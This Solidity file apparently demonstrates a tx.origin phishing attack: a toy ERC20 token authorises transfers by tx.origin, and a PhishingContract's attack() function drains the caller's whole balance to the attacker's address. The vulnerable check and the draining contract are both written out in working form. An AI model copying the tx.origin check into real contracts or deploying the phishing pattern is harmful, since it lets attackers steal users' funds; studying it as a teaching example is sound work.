//SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

// Smart Contract Phishing Attack with tx.origin
contract contractA {
    function callContractB(address _contractB) public view returns(address sender,address origin) {
        (sender,origin) = contractB(_contractB).getContractA();
    }
}

contract contractB {
    function getContractA() public view returns(address,address) {
        return (msg.sender,tx.origin);
    }
}

contract ERC20 {
    constructor() {
        _balance[msg.sender] = 1000;
    }

    mapping(address => uint256) public _balance;

    function transfer(address _from,address _to, uint _amount) public {
        require(tx.origin == _from, "Not owner");
        require(_balance[_from] >= _amount,"Not Enough Balance");

        _balance[_from] -=_amount;
        _balance[_to] +=_amount;
    }

    function getBalance(address _address) public view returns(uint256) {
        return _balance[_address];
    }
}

contract PhishingContract {
    address public AttackerAddress;
    ERC20 _ERC20;

    constructor(ERC20 _ERC20_) {
        AttackerAddress = msg.sender;
        _ERC20 = _ERC20_;
    }

    function attack() public {
        _ERC20.transfer(msg.sender, AttackerAddress,_ERC20.getBalance(msg.sender));
    }
}

